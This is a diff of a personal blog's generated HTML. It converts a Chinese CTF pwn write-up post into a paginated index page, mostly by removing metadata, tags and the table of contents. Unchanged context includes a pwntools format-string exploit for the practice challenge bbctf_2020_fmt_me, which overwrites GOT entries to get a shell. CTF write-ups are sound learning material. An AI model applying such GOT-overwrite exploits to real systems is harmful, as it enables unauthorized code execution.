@@ -20,65 +20,28 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="(fini.arry)ciscn_2019_sw_1保护&amp;源码保护：   源码： int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char format[68]; &#x2F;&#x2F; [esp+0h] [ebp-48h] BYREF  setvbuf(stdin, 0, 2, 0);  setvbuf(std">
-<meta property="og:type" content="article">
-<meta property="og:title" content="BUU刷题记录">
-<meta property="og:url" content="http://example.com/2023/11/11/BUU%E5%88%B7%E9%A2%98/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Qwen&#39;s blog">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Qwen&#39;s blog">
-<meta property="og:description" content="(fini.arry)ciscn_2019_sw_1保护&amp;源码保护：   源码： int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char format[68]; &#x2F;&#x2F; [esp+0h] [ebp-48h] BYREF  setvbuf(stdin, 0, 2, 0);  setvbuf(std">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053168.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102943.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053159.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101049.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053695.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101669.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053805.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101413.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053191.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100759.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053220.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100880.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053917.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059447.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053109.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053124.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059332.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053000.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053566.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059468.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058647.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053477.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058257.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101057676.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053413.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053521.png">
-<meta property="article:published_time" content="2023-11-11T02:53:06.000Z">
-<meta property="article:modified_time" content="2024-07-10T18:12:08.875Z">
 <meta property="article:author" content="Qwen">
-<meta property="article:tag" content="pwn">
-<meta property="article:tag" content="格式化字符串漏洞">
-<meta property="article:tag" content="栈迁移">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png">
 
-<link rel="canonical" href="http://example.com/2023/11/11/BUU%E5%88%B7%E9%A2%98/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+<link rel="canonical" href="http://example.com/page/2/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : false,
-    isPost : true,
+    isHome : true,
+    isPost : false,
     lang   : 'en'
   };
 </script>
 
-  <title>BUU刷题记录 | Qwen's blog</title>
+  <title>Qwen's blog</title>
   
 
 
@@ -186,10 +149,9 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content index posts-expand">
             
-
-    
+      
   
   
    <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -205,9 +167,10 @@
       <meta itemprop="name" content="Qwen's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          BUU刷题记录
-        </h1>
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/11/BUU%E5%88%B7%E9%A2%98/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">BUU刷题记录</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -236,13 +199,6 @@
             </span>
 
           
-            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
 
         </div>
       </header>
@@ -253,7 +209,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
+          <h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
 <img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png" alt="image-20240710110220628" style="zoom:67%;" />
 
 <p>源码：</p>
@@ -385,36 +341,25 @@
 <h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27604)</span></span><br><span class="line">debug(p,<span class="number">0x4012d5</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;atoi_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;system_plt&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;system&#x27;</span>]:elf.sym[<span class="string">&#x27;main&#x27;</span>]&#125;,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload+= fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">&#x27;snprintf&#x27;</span>]:<span class="number">0x401056</span>&#125;,<span class="number">8</span>,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
+      
     </div>
 
     
     
     
-
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
-              <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag"># 栈迁移</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2023/12/09/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%85%B3%E4%BA%8Eret2shellcode%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="next" title="关于ret2shellcode的学习总结">
-      关于ret2shellcode的学习总结 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
+        <div class="post-eof"></div>
       </footer>
-    
   </article>
   
   
   
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
 
 
 
@@ -466,7 +411,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fini-arry-ciscn-2019-sw-1"><span class="nav-number">1.</span> <span class="nav-text">(fini.arry)ciscn_2019_sw_1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-%E6%BA%90%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">保护&amp;源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#qctf-2018-dice-game"><span class="nav-number">2.</span> <span class="nav-text">qctf_2018_dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%951"><span class="nav-number">2.1.</span> <span class="nav-text">法1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%952"><span class="nav-number">2.2.</span> <span class="nav-text">法2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#canary-linkctf-2018-7-babypie"><span class="nav-number">3.</span> <span class="nav-text">(canary)linkctf_2018.7_babypie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-%E6%BA%90%E7%A0%81-1"><span class="nav-number">3.1.</span> <span class="nav-text">保护&amp;源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">3.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">3.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%A4%E6%8D%A2%E5%8F%98%E9%87%8F%E5%80%BC-pwnable-loveletter"><span class="nav-number">4.</span> <span class="nav-text">(交换变量值)pwnable_loveletter</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-%E6%BA%90%E7%A0%81-2"><span class="nav-number">4.1.</span> <span class="nav-text">保护&amp;源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="nav-number">4.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-2"><span class="nav-number">4.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#picoctf-2018-echo-back-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">5.</span> <span class="nav-text">picoctf_2018_echo back(格式化字符串)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-%E6%BA%90%E7%A0%81-3"><span class="nav-number">5.2.</span> <span class="nav-text">保护&amp;源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-3"><span class="nav-number">5.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GKCTF-2021-checkin"><span class="nav-number">6.</span> <span class="nav-text">[GKCTF 2021]checkin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4"><span class="nav-number">6.1.</span> <span class="nav-text">保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">6.2.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="nav-number">6.3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-4"><span class="nav-number">6.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bbctf-2020-fmt-me"><span class="nav-number">7.</span> <span class="nav-text">bbctf_2020_fmt_me</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">7.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-1"><span class="nav-number">7.2.</span> <span class="nav-text">保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">7.3.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-5"><span class="nav-number">7.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
